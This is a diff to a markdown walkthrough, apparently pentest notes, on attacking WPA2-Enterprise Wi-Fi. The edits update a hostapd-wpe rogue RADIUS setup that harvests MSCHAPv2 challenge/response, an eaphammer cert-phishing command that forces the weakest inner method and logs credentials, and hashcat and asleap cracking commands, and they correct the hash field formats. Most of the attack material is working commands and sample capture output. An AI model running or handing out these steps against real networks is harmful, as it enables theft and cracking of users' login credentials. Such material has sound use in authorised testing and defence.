@@ -1,5 +1,7 @@
 # enterprise — walkthrough
 
+**Verified against:** hostapd-wpe (hostapd 2.10) / eaphammer 1.14 / hashcat 6.2.x as of 2026-Q3
+
 Two engagements. Path A stands up a rogue RADIUS with `hostapd-wpe`
 and harvests MSCHAPv2 chal/resp. Path B uses `eaphammer` for cert-
 phishing against weak-validation clients and captures plaintext GTC.
@@ -45,12 +47,17 @@ hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
 `hostapd-wpe` logs captures to `/var/log/hostapd-wpe.log`:
 
 ```
-username: alice
-challenge: 6f3b...
-response: c8e1f...
-jtr NETNTLM: alice:$NETNTLM$...
-hashcat 5500: alice::CorporateWiFi:c8e1f...
+username:      alice
+challenge:     6f3b...                              # 8-byte ChallengeHash
+response:      c8e1f...                             # 24-byte NTResponse
+jtr NETNTLM:   alice:$NETNTLM$...
+hashcat 5500:  alice::CorporateWiFi::c8e1f...:6f3b... # user::domain::<NTResp>:<ChallengeHash>
 ```
+
+The `challenge` field is the pre-derived 8-byte `ChallengeHash`
+(SHA1(PeerChallenge || AuthenticatorChallenge || Username)[:8]).
+Full derivation and hashcat-5500 field spec in the "MSCHAPv2
+ChallengeHash derivation" callout of `enterprise/reference.md`.
 
 ## Path B — eaphammer cert-phish
 
@@ -68,11 +75,11 @@ cd eaphammer && ./kali-setup
   --auth wpa-eap \
   --essid CorporateWiFi \
   --channel 6 \
-  --negotiate downgrade \
+  --negotiate weakest \
   --creds
 ```
 
-`--negotiate downgrade` offers weak inner methods first (PEAP → GTC
+`--negotiate weakest` offers weak inner methods first (PEAP → GTC
 then MSCHAPv2). `--creds` logs to `loot/`.
 
 For clients that require a *specific* CA:
@@ -91,8 +98,10 @@ For clients that require a *specific* CA:
 # hostapd-wpe already emitted a hashcat 5500 line:
 hashcat -m 5500 mschapv2.hash rockyou.txt -r best64.rule -w 4
 
-# asleap alternative:
-asleap -C <challenge_hex> -R <response_hex> -W rockyou.txt
+# asleap alternative — same 8-byte ChallengeHash / 24-byte NTResponse
+# as the hashcat 5500 fields; not the raw wire challenges. See the
+# derivation callout in enterprise/reference.md.
+asleap -C <ChallengeHash_hex> -R <NTResponse_hex> -W rockyou.txt
 ```
 
 ## Path D — Capture the plaintext GTC token
